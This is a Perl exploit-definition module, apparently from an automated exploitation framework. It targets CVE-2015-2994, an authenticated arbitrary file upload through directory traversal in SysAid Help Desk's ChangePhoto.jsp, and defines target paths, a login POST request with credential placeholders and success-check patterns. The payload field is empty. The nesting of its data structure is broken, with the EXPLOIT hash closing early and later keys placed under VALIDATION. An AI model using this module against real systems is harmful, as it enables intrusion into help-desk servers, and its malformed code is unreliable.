package SYSAID::MSF::SysaidAuthFileUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SysaidAuthFileUpload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2015-2994",
  DESCRIPTION => "

        This module exploits a file upload vulnerability in SysAid Help Desk.

        The vulnerability exists in the ChangePhoto.jsp in the administrator portal,

        which does not correctly handle directory traversal sequences and does not

        enforce file extension restrictions. While an attacker needs an administrator

        account in order to leverage this vulnerability, there is a related Metasploit

        auxiliary module which can create this account under some circumstances.

        This module has been tested in SysAid v14.4 in both Linux and Windows.

      ",
  METHOD => "GET",
  MSF_MODULE => "sysaid_auth_file_upload",
  PATH => "Login.jsp?isUpload=true&",
  PATHS => ["errorInSignUp.htm", "Login.jsp", "ChangePhoto.jsp"],
  PAYLOAD => "",
  REFERENCES => ["http://seclists.org/fulldisclosure/2015/Jun/8"],
  TITLE => "SysAid Help Desk Administrator Portal Arbitrary File Upload",
  VARIABLES => {
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TREGEX' =>       "parent.glSelectedImageUrl = \\\"\\(.*\\)\\\"",
    'TSTRING' =>       "css\\",

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'Login.jsp',
      PAYLOAD      => 'userName=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /Login.jsp',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
